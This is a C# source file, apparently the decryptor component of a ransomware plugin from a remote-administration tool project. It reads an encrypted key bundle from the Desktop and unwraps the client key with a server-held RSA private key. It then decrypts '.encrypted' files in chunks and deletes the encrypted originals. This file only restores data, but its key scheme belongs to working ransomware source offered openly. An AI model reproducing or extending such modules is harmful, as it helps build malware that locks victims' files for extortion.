using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin.Operation
{
    internal class ActionDecryption
    {
        private readonly int BUFFER_CHUNK_SIZE = 10485760;
        private delegate void ActionDelegate(Dictionary<string, string> files);
        private delegate string FileAction(KeyValuePair<string, string> file);

        private ActionDelegate actionDelegate;
        private FileAction fileAction;

        private StringBuilder rsaPrivateKey { get; set; }
        internal Encryption.Encrypted decryption { get; set; }

        internal ActionDecryption(string privateRSAServerKey)
        {
            this.rsaPrivateKey = new StringBuilder();

            this.decryption = JsonConvert.DeserializeObject<Encryption.Encrypted>(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\encrypted.json"));
            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\encrypted.json");

            foreach (string keyPart in decryption.clientRSAPrivate)
            {
                byte[] converted = Convert.FromBase64String(keyPart);

                byte[] decrypted = Encryption.RSA.RSADecrypt(converted, privateRSAServerKey);

                rsaPrivateKey.Append(Encoding.Default.GetString(decrypted));
            }

            this.actionDelegate = new ActionDelegate(Do);
            this.fileAction = new FileAction(FileDecryptionOperated);
        }

        internal void StartAction(Dictionary<string, string> files)
        {
            this.actionDelegate.BeginInvoke(files, new AsyncCallback(EndAction), null);
        }

        private void AppendToFile(string fileToWrite, byte[] data)
        {
            using (FileStream FS = new FileStream(fileToWrite, File.Exists(fileToWrite) ? FileMode.Append : FileMode.OpenOrCreate, FileAccess.Write))
            {
                FS.Write(data, 0, data.Length);
                FS.Close();
            }
        }


        private void Do(Dictionary<string, string> files)
        {

            foreach (KeyValuePair<string, string> file in files)
            {

                IAsyncResult ar = this.fileAction.BeginInvoke(file, null, null);
                string filePath = this.fileAction.EndInvoke(ar);
                File.Delete(filePath);
            }
        }


        private string FileDecryptionOperated(KeyValuePair<string, string> file)
        {
            byte[] key = Encryption.RSA.RSADecrypt(Convert.FromBase64String(file.Value), rsaPrivateKey.ToString());

            string fullPath = file.Key + ".encrypted";

            using (Stream source = File.OpenRead(fullPath))
            {
                byte[] buffer = new byte[BUFFER_CHUNK_SIZE];
                int bytesRead = 0;
                long currentOffset = 0;
                long totalSize = new FileInfo(fullPath).Length;

                if (totalSize > BUFFER_CHUNK_SIZE)
                {
                    while ((bytesRead = source.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        byte[] decrypted = Encryption.RSM.RSMDecrypt(buffer, key);
                        AppendToFile(file.Key, decrypted);

                        currentOffset += bytesRead;
                        totalSize -= bytesRead;
                        if (totalSize < BUFFER_CHUNK_SIZE)
                            buffer = new byte[totalSize];
                    }
                }
                else
                {
                    buffer = new byte[totalSize];
                    bytesRead = source.Read(buffer, 0, buffer.Length);

                    byte[] decrypted = Encryption.RSM.RSMDecrypt(buffer, key);
                    AppendToFile(file.Key, decrypted);
                }
            }
            return fullPath;
            //return true;
        }


        private void EndAction(IAsyncResult ar)
        {
            actionDelegate.EndInvoke(ar);
        }
    }
}
